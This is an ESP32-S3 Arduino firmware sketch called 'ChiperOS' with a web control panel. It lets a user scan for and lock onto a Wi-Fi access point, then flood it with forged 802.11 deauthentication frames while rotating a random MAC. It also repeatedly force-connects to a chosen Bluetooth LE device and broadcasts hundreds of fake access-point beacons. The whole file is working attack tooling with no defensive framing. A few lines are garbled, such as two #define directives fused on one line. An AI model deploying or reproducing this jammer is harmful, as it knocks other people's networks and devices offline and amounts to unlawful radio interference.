/*
 * ChiperOS v21.3 - ESP32-S3 DEAUTH + WEB CONTROL (FIXED FORMATTING)
 * Board: ESP32-S3-N16R8 (DevKitC-1)
 */
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <esp_random.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEClient.h>

// === HTML UI - MUST BE AT TOP ===
const char H[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>ChiperOS</title><style>
*{margin:0;padding:0;box-sizing:border-box}body{font:13px monospace;background:#0a0a0a;color:#c0c0c0}
.hd{text-align:center;padding:15px;border-bottom:2px solid #4a1c6e;margin-bottom:10px}
.kc{font-size:2em;color:#9b6eb5;text-shadow:0 0 8px #4a1c6e}.vr{color:#666;font-size:0.9em}
.bd{color:#9b6eb5;font-size:0.8em;background:#1a1a1a;display:inline-block;padding:3px 8px;border:1px solid #4a1c6e;border-radius:3px;margin-top:5px}
.ct{max-width:700px;margin:0 auto;padding:10px}
.tabs{display:flex;gap:5px;margin-bottom:10px}
.tab{flex:1;background:#1a1a1a;color:#888;border:1px solid #333;padding:8px;cursor:pointer;border-radius:4px;text-align:center;font-weight:bold}
.tab:hover{background:#252525}.tab.a{background:#4a1c6e;color:#fff}
.sc{background:#111;border:1px solid #333;border-radius:4px;padding:10px;display:none;margin-bottom:8px}.sc.a{display:block}
h3{color:#9b6eb5;border-bottom:1px solid #333;padding-bottom:5px;margin-bottom:8px;font-size:1em}
.btn{background:#4a1c6e;color:#fff;border:none;padding:8px 14px;margin:3px;cursor:pointer;border-radius:3px;font-weight:bold}
.btn:hover{background:#5a2c7e}.btn-r{background:#6e1c4a}.btn:disabled{background:#333;color:#666;cursor:not-allowed}
.log{background:#080808;padding:6px;height:100px;overflow-y:auto;font-size:0.85em;margin-top:6px;border:1px solid #222;border-radius:3px}
.row{display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin:5px 0}
.net{padding:5px 6px;border-bottom:1px solid #222;display:flex;justify-content:space-between;cursor:pointer;font-size:0.9em}
.net:hover{background:#1a1a1a}.net.s{background:#4a1c6e}
.tag{background:#2a2a2a;padding:1px 4px;border-radius:2px;font-size:0.75em;color:#9b6eb5}
.func{background:#151515;border:1px solid #2a2a2a;padding:8px;margin:4px 0;border-radius:3px}
.ft{color:#9b6eb5;font-weight:bold;margin-bottom:4px;font-size:0.9em}
#st{font-weight:bold;color:#0ff}
</style></head><body>
<div class='hd'><div class='kc'>KOSMOC CREATOR</div><div class='vr'>ChiperOS v21.3 - PATCHED</div><div class='bd'>ESP32-S3</div></div>
<div class='ct'>
<div class='tabs'>
<div class='tab a' onclick='sw("w")'>WIFI</div><div class='tab' onclick='sw("b")'>BLE</div><div class='tab' onclick='sw("a")'>AP</div>
</div>
<div id='w' class='sc a'><h3>WIFI DEAUTH</h3>
<div class='func'><div class='ft'>1. Scanner (Tap to LOCK)</div><div class='row'><button class='btn' onclick='scn()'>SCAN</button><span id='sn' style='color:#666'></span></div><div id='nl' class='log'>Ready</div></div>
<div class='func'><div class='ft'>2. Target: <span id='tg'>None</span> | <span id='lk' style='color:#f44'>UNLOCKED</span></div></div>
<div class='func'><div class='ft'>3. MAX JAM (Requires Target)</div>
<div class='row'><button class='btn btn-r' id='jg' onclick='jam(1)'>START</button><button class='btn' id='js' onclick='jam(0)' disabled>STOP</button></div>
<div id='jl' class='log'>Select a network first</div>
</div></div>
<div id='b' class='sc'><h3>BLE SPAM</h3>
<div class='func'><div class='ft'>1. Scan BLE</div><div class='row'><button class='btn' onclick='bleScan()'>SCAN</button></div><div id='bl' class='log'>Tap device to select</div></div>
<div class='func'><div class='ft'>2. Target: <span id='btgt'>None</span></div></div>
<div class='func'><div class='ft'>3. Connection Flood</div>
<div class='row'><button class='btn btn-r' id='bg' onclick='bleJ(1)'>START</button><button class='btn' id='bs2' onclick='bleJ(0)' disabled>STOP</button></div>
<div id='bjl' class='log'>Select BLE target first</div>
</div>
</div>
<div id='a' class='sc'><h3>FAKE AP (350)</h3>
<div class='func'><div class='ft'>1. Spam AP</div><div class='row'><button class='btn' id='ag' onclick='apS(1)'>START</button><button class='btn' id='as' onclick='apS(0)' disabled>STOP</button></div><div id='al' class='log'>Names: ХАХАХА Я СПАМЕР1..350</div></div>
</div>
</div>
<script>
const $=id=>document.getElementById(id);
function sw(t){document.querySelectorAll('.tab').forEach(x=>x.classList.remove('a'));document.querySelectorAll('.sc').forEach(x=>x.classList.remove('a'));event.target.classList.add('a');$(t).classList.add('a');}
async function api(e){try{const r=await fetch(e);return r.ok?await r.json():null}catch{return null}}
function lg(id,m){const l=$(id);l.innerHTML=`[${new Date().toLocaleTimeString()}] ${m}<br>`+l.innerHTML;}
async function scn(){
  $('nl').innerHTML='<span style="color:#9b6eb5">Scanning...</span>';
  await fetch('/sc');
  for(let i=0;i<15;i++){
    await new Promise(r=>setTimeout(r,400));
    const d=await api('/sc');
    if(d && !d.scanning){
      let h=''; d.forEach(n=>{h+=`<div class="net" onclick="lock('${n.b}')"><span>${n.s||'?'} <span class='tag'>${n.b}</span></span><span>${n.r}dBm</span></div>`;});
      $('nl').innerHTML=h||'None'; $('sn').textContent=d.length+' nets'; return;
    }
  }
  $('nl').innerHTML='<span style="color:#f44">Scan timeout</span>';
}
async function lock(b){const r=await api('/lock?b='+b);if(r&&r.locked){$('tg').innerHTML=b;$('lk').innerHTML='LOCKED';$('lk').style.color='#0f0';lg('nl','Target saved.');}else{lg('nl','Lock failed');}}
async function jam(s){$('jg').disabled=s;$('js').disabled=!s;const r=await api('/jam?on='+(s?1:0));if(!r.ok&&s){lg('jl',r.msg||'SELECT TARGET FIRST');$('jg').disabled=false;$('js').disabled=true;return;}lg('jl',s?'DEAUTH ACTIVE':'Stopped');}
async function bleScan(){$('bl').innerHTML='<span style="color:#9b6eb5">Scanning...</span>';const d=await api('/ble_scan');if(!d)return;let h='';d.forEach(n=>{h+=`<div class="net" onclick="bleSel('${n.m}')"><span>${n.n||n.m} <span class='tag'>${n.m}</span></span><span>${n.r}dBm</span></div>`;});$('bl').innerHTML=h||'No devices';}
async function bleSel(m){await api('/ble_sel?m='+m);$('btgt').innerHTML=m;lg('bl','Selected: '+m);}
async function bleJ(s){$('bg').disabled=s;$('bs2').disabled=!s;const r=await api('/ble_jam?on='+(s?1:0));if(!r.ok&&s){lg('bjl',r.msg||'SELECT BLE TARGET');$('bg').disabled=false;$('bs2').disabled=true;return;}lg('bjl',s?'BLE FLOOD':'Stopped');}
async function apS(s){$('ag').disabled=s;$('as').disabled=!s;await api('/ap?on='+(s?1:0));lg('al',s?'AP SPAM ACTIVE':'Stopped');}
async function st(){const d=await api('/st');if(!d)return;$('st').textContent=d.mode;
$('jg').disabled=(d.mode!='IDLE');$('js').disabled=(d.mode=='IDLE');
$('bg').disabled=(d.mode!='IDLE');$('bs2').disabled=(d.mode=='IDLE');
$('ag').disabled=(d.mode!='IDLE');$('as').disabled=(d.mode=='IDLE');}
setInterval(st,1000);st();
</script></body></html>
)rawliteral";

// === GLOBAL DEFINES ===
#define LED 2
#define M_IDLE 0
#define M_JAM 1
#define M_BLEJAM 2#define M_APSCAM 3

// === GLOBALS ===
WebServer srv(80);
BLEScan* pBLEScan = nullptr;

uint8_t task = M_IDLE, ch = 6, mac[6] = {0}, tgt[6] = {0}, bleTgt[6] = {0};
bool isLocked = false, bleJamming = false, wifiScanning = false;
unsigned long tPkt=0, tLock=0, tMac=0, tBle=0, tAp=0, tScanStart=0;
uint32_t seq=0;
String cachedScan = "[]";

// === UTILS ===
void rMac(uint8_t*m){ 
  for(int i=0;i<6;i++) m[i]=esp_random()&0xFF; 
  m[0]|=0x02; m[0]&=~0x01; 
}

void lockTarget(uint8_t*bssid){
  memcpy(tgt, bssid, 6);
  int n = WiFi.scanNetworks(false, true, false, 3000);
  for(int i=0;i<n;i++){
    if(WiFi.BSSID(i) && memcmp(WiFi.BSSID(i), tgt, 6)==0){
      ch = WiFi.channel(i); isLocked = true; tLock = millis(); break;
    }
  }
  WiFi.scanDelete();
}

void checkChannel(){
  if(!isLocked || millis()-tLock<20000) return;
  int n = WiFi.scanNetworks(false, true, false, 2000);
  bool found=false;
  for(int i=0;i<n;i++){
    if(WiFi.BSSID(i) && memcmp(WiFi.BSSID(i), tgt, 6)==0){
      uint8_t nc = WiFi.channel(i);
      if(nc!=ch){ ch=nc; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); }
      found=true; tLock=millis(); break;
    }
  }
  WiFi.scanDelete();
  if(!found) isLocked=false;
}

void rotateMac(){
  if(millis()-tMac>10000){ rMac(mac); esp_wifi_set_mac(WIFI_IF_STA, mac); tMac=millis(); }
}

// === DEAUTH TX ===
void sendDeauth(const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {    __attribute__((aligned(4))) uint8_t packet[26];
    packet[0] = 0xC0; packet[1] = 0x00;
    packet[2] = 0x00; packet[3] = 0x00;
    memcpy(&packet[4], da, 6); memcpy(&packet[10], sa, 6); memcpy(&packet[16], bssid, 6);
    packet[22] = (seq & 0x0F) << 4; packet[23] = (seq >> 4) & 0xFF; seq++;
    packet[24] = 0x07; packet[25] = 0x00;
    esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
    delayMicroseconds(15);
}

// === BLE CALLBACK ===
class MyScanCB : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) override {}
};

// === WEB HANDLERS ===
void hRoot(){ srv.send(200,"text/html",H); }

void hSt(){
  char m[18]; sprintf(m,"%02X:%02X:%02X:%02X:%02X:%02X",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
  String modeStr = "IDLE";
  if(task == M_JAM) modeStr = "DEAUTH";
  else if(task == M_BLEJAM) modeStr = "BLE";
  else if(task == M_APSCAM) modeStr = "AP";
  srv.send(200,"application/json","{\"mode\":\""+modeStr+"\",\"c\":"+String(ch)+",\"m\":\""+String(m)+"\",\"locked\":"+String(isLocked?"true":"false")+"}");
}

void hSc(){
  if(wifiScanning){ srv.send(200,"application/json","{\"scanning\":true}"); return; }
  if(cachedScan != "[]"){ srv.send(200,"application/json",cachedScan); return; }
  WiFi.scanNetworks(true, false, true, 120); 
  wifiScanning = true; tScanStart = millis();
  srv.send(200,"application/json","{\"scanning\":true}");
}

void hLock(){
  String b=srv.arg("b");
  if(b.length()==17){
    uint8_t bb[6]; sscanf(b.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&bb[0],&bb[1],&bb[2],&bb[3],&bb[4],&bb[5]);
    memcpy(tgt, bb, 6); isLocked = true;
  }
  srv.send(200,"application/json","{\"ok\":true,\"locked\":"+String(isLocked?"true":"false")+"}");
}

void hJam(){
  if(srv.arg("on")=="1"){
    if(!isLocked){ srv.send(400,"application/json","{\"ok\":false,\"msg\":\"SELECT TARGET FIRST\"}"); return; }
    task=M_JAM; esp_wifi_set_promiscuous(true); esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    tPkt=millis(); tMac=millis(); seq=esp_random();
  } else { esp_wifi_set_promiscuous(false); task=M_IDLE; }  srv.send(200,"application/json","{\"ok\":true}");
}

void hBleScan(){
  if(!pBLEScan){
    BLEDevice::init("");
    pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyScanCB());
    pBLEScan->setInterval(100); pBLEScan->setWindow(99); pBLEScan->setActiveScan(true);
  }
  uint8_t prev = task; if(task==M_APSCAM) task=M_IDLE;
  BLEScanResults res = pBLEScan->start(1, false); 
  String j="[";
  int cnt = res.getCount();
  for(int i=0;i<cnt && i<15;i++){
    BLEAdvertisedDevice d = res.getDevice(i);
    if(i>0) j+=",";
    String name = d.haveName() ? String(d.getName().c_str()) : String(d.getAddress().toString().c_str());
    j+="{\"m\":\""+String(d.getAddress().toString().c_str())+"\",\"n\":\""+name+"\",\"r\":"+String(d.getRSSI())+"}";
  }
  j+="]"; task=prev;
  srv.send(200,"application/json",j);
}

void hBleSel(){
  String m=srv.arg("m");
  if(m.length()==17){
    int b[6]; sscanf(m.c_str(),"%x:%x:%x:%x:%x:%x",&b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
    for(int i=0;i<6;i++) bleTgt[i]=b[i];
  }
  srv.send(200,"application/json","{\"ok\":true}");
}

void hBleJam(){
  if(srv.arg("on")=="1"){
    uint8_t empty[6] = {0};
    if(memcmp(bleTgt, empty, 6)==0){ srv.send(400,"application/json","{\"ok\":false,\"msg\":\"SELECT BLE TARGET\"}"); return; }
    task=M_BLEJAM; bleJamming=true; tBle=millis();
  } else { bleJamming=false; task=M_IDLE; }
  srv.send(200,"application/json","{\"ok\":true}");
}

void hAp(){
  if(srv.arg("on")=="1"){ task=M_APSCAM; tAp=millis(); }
  else { task=M_IDLE; }
  srv.send(200,"application/json","{\"ok\":true}");
}

void setupWeb(){
  srv.on("/",HTTP_GET,hRoot); srv.on("/st",HTTP_GET,hSt); srv.on("/sc",HTTP_GET,hSc);  srv.on("/lock",HTTP_GET,hLock); srv.on("/jam",HTTP_GET,hJam);
  srv.on("/ble_scan",HTTP_GET,hBleScan); srv.on("/ble_sel",HTTP_GET,hBleSel); srv.on("/ble_jam",HTTP_GET,hBleJam);
  srv.on("/ap",HTTP_GET,hAp); srv.begin();
}

// === TASK LOOPS ===
void runJam(){
  if(task!=M_JAM || !isLocked) return;
  checkChannel(); rotateMac();
  uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  sendDeauth(bc, tgt, tgt); sendDeauth(tgt, bc, tgt);
  tPkt=millis();
}

void runBleJam(){
  if(task!=M_BLEJAM || !bleJamming) return;
  if(millis()-tBle>200){
    tBle=millis();
    BLEAddress target(bleTgt);
    BLEClient* cli = BLEDevice::createClient();
    if(cli){ if(cli->connect(target)) cli->disconnect(); delete cli; }
  }
}

void runAp(){
  if(task!=M_APSCAM) return;
  if(millis()-tAp>150){
    tAp=millis();
    for(int i=0;i<50;i++){
      uint8_t m[6], p[128]={0}; rMac(m);
      p[0]=0x80; p[1]=0x00; memset(&p[4],0xFF,6); memcpy(&p[10],m,6); memcpy(&p[16],m,6);
      p[32]=0x64; p[33]=0x00; p[34]=0x01; p[35]=0x00;
      char name[32]; sprintf(name,"ХАХАХА Я СПАМЕР%d", ((tAp/150)*50 + i) % 350 + 1);
      uint8_t sl=strlen(name); if(sl>32) sl=32;
      p[36]=0x00; p[37]=sl; memcpy(&p[38],name,sl);
      uint8_t o=38+sl;
      p[o++]=0x01; p[o++]=0x08; p[o++]=0x82; p[o++]=0x84; p[o++]=0x8B; p[o++]=0x96;
      p[o++]=0x0C; p[o++]=0x12; p[o++]=0x18; p[o++]=0x24;
      p[o++]=0x03; p[o++]=0x01; p[o++]=ch;
      esp_wifi_80211_tx(WIFI_IF_AP,p,o,false);
      delayMicroseconds(100);
    }
  }
}

// === SETUP & LOOP ===
void setup(){
  Serial.begin(115200); delay(1000);
  pinMode(LED,OUTPUT); digitalWrite(LED,LOW);
  rMac(mac); esp_wifi_set_mac(WIFI_IF_STA, mac);  esp_wifi_set_max_tx_power(80);
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAP("ChiperOS","1234567890",6,0,4);
  delay(500);
  setupWeb();
  Serial.println("[OK] READY. IP: "+WiFi.softAPIP().toString());
}

void loop(){
  if(wifiScanning){
    int res = WiFi.scanComplete();
    if(res >= 0){
      String j="[";
      for(int i=0;i<res && i<20;i++){
        if(i>0) j+=",";
        j+="{\"s\":\""+WiFi.SSID(i)+"\",\"b\":\""+WiFi.BSSIDstr(i)+"\",\"r\":"+String(WiFi.RSSI(i))+"}";
      }
      j+="]"; cachedScan=j; wifiScanning=false; WiFi.scanDelete();
    } else if(millis()-tScanStart > 5000){
      cachedScan="[]"; wifiScanning=false; WiFi.scanDelete();
    }
  }
  srv.handleClient();
  if(task==M_JAM) runJam();
  else if(task==M_BLEJAM) runBleJam();
  else if(task==M_APSCAM) runAp();
  delay(1); yield();
}
